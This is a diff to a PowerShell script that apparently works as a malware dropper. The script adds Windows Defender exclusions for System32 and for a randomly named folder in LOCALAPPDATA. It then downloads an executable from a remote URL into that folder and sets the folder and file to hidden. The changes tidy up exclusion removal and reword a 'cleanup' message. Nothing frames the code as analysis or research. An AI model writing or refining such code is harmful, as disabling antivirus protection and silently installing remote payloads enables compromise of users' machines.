@@ -22,18 +22,22 @@ function Add-Exclusion {
 function Remove-Exclusion {
     param ([string]$Path)
     try {
-        Remove-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
+        $exclusions = (Get-MpPreference).ExclusionPath
+        if ($exclusions -contains $Path) {
+            Remove-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
+        }
     } catch {}
 }
 
 Add-Exclusion -Path "C:\Windows\System32"
 
 $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
-New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null
 $tempPath = Join-Path $hiddenFolder $updaterExe
 
 try {
+    New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null
     Add-Exclusion -Path $hiddenFolder
+
     Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     (Get-Item $hiddenFolder).Attributes += 'Hidden'
     (Get-Item $tempPath).Attributes += 'Hidden'
@@ -57,4 +61,4 @@ catch {
     exit 1
 }
 
-Write-Host "Successfully cleaned up"
+Write-Host "Cleanup complete."
